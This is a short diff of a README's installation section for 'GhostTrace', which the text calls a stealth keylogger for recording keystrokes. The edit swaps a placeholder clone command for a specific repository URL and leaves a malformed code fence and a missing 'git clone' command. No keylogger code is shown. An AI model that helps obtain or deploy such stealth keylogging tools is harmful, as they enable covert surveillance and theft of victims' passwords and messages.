@@ -10,8 +10,8 @@ GhostTrace is a stealth keylogger tool designed to record and log keystrokes eff
 
 ## Installation
 1. Clone the repository:
-   ```bash
-   git clone https://github.com/yourusername/GhostTrace.git
+   ```bash[
+   https://github.com/mrz-Z0r4B/GhostTrace.git
    ```
 2. Navigate to the project directory:
    ```bash
